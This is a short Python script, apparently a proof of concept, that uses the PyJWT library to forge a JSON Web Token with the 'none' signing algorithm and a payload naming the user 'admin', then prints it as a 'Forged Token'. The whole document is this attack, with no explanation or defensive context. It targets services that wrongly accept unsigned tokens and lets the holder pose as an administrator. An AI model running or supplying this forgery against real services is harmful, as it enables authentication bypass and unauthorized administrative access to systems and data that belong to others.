import jwt
header = {"alg":"none","typ":"JWT"}
payload = {"user":"admin"}
token = jwt.encode(payload, key='', algorithm=None, headers=header)
print("Forged Token:", token)
